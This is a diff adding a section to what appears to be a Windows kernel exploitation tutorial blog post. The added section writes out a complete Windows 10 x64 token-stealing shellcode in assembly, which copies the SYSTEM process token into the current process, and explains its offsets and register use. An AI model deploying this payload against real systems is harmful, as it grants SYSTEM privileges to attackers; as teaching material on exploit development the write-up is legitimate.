@@ -186,3 +186,40 @@ __loop:
 	cmp rcx, 4 			; Compare PID to SYSTEM PID 
 	jnz __loop			; Loop until SYSTEM PID is found
 ```
+
+Once that SYSTEM `_EPROCESS` structure has been found, we can now go ahead and retrieve the token and copy it to our current process. This will unleash God mode on our current process. God, please have mercy on the soul of our poor little process.
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/Picture1.png" alt="">
+
+Once we have found the SYSTEM process, remember that the `Token` element is located at an offset of 0x358 to the `_EPROCESS` structure of the process.
+
+Let's finish out the rest of our token stealing payload for Windows 10 x64.
+
+```nasm
+; Windows 10 x64 Token Stealing Payload
+; Author Connor McGarr
+
+[BITS 64]
+
+_start:
+	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
+	mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
+	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
+__loop:
+	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
+	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
+	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
+	cmp rcx, 4 			; Compare PID to SYSTEM PID 
+	jnz __loop			; Loop until SYSTEM PID is found
+
+	mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
+	and cl, 0xf0			; Clear out _EX_FAST_REF RefCnt
+	mov [rax + 0x358], rcx		; Copy SYSTEM token to current process
+
+	xor rax, rax			; set NTSTATUS SUCCESS
+	ret				; Done!
+```
+
+Notice our use of logical AND. We are clearing out the last 4 bits of the RCX register, via the CL register.. If you have read my [post](https://connormcgarr.github.io/WS32_recv()-Reuse/) about a socket reuse exploit, you will know I talk about using the lower byte registers of the x86 or x64 registers (RCX, ECX, CX, CH, CL, etc).
+
+As you can see also, we ended our shellcode by using logical XOR to clear out RAX. NTSTATUS uses RAX as the regsiter for the error code. NTSTATUS, when a value of 0 is returned, means the operations successfully performed.
